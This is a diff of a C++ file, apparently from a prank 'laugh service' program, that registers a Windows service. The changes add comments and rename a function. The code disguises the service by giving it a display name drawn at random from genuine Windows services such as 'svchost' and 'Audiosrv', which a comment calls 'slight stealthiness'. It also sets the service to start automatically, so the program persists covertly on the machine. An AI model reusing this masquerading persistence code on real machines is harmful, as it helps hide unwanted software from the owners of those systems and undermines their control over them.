@@ -4,7 +4,9 @@
 #include <vector>
 
 
-
+/*
+    This file contains all code necessary to register and start and stop and delete services
+*/
 
 
 std::vector<std::string> Sample_Service_Names = {"Audiosrv", "BluetoothUserService", "COMSysApp", "svchost",
@@ -13,8 +15,14 @@ std::vector<std::string> Sample_Service_Names = {"Audiosrv", "BluetoothUserServi
 
 
 
-int register_service_laugh_sound(std::string service_path, std::string Service_Name)
+int register_service(std::string service_path, std::string Service_Name)
 {
+    /*
+        Responsible to install a service, Executable must be run with administrator privileges
+        Service path is the path to the executable with service functions (see laugh_service.cpp and you'll understand the boilerplate)
+        Service name is just a name to be able to stop and delete the service, it should be easily traceable to be able to easily stop and delete the service
+        otherwise reverting back to the machine's original state is gonna be hard
+    */
 
     srand(time(0));
     int random_index = rand()%Sample_Service_Names.size();
@@ -25,11 +33,11 @@ int register_service_laugh_sound(std::string service_path, std::string Service_N
     {
         SC_HANDLE hService = CreateServiceA(
             hSCManager,
-            Service_Name.c_str(),//"LaughService",   //TECH DEBT         // Service name, I will leave this name constant just to make it easier for me -Ayman- to kill this service if I ever wanted to
-            Sample_Service_Names[random_index].c_str(),//"MP3Service",  // Display name
+            Service_Name.c_str(),   //TECH DEBT         // Service name, I will leave this name constant just to make it easier for me -Ayman- to kill this service if I ever wanted to
+            Sample_Service_Names[random_index].c_str(),// Display name, made random to achieve slight stealthiness
             SERVICE_ALL_ACCESS,          // Access rights
             SERVICE_WIN32_OWN_PROCESS,   // Service type
-            SERVICE_AUTO_START,          // Start type
+            SERVICE_AUTO_START,          // Start type, I always choose it to be autostart
             SERVICE_ERROR_NORMAL,        // Error control type
             service_path.c_str(), // Path to the service executable
             NULL, NULL, NULL, NULL, NULL);
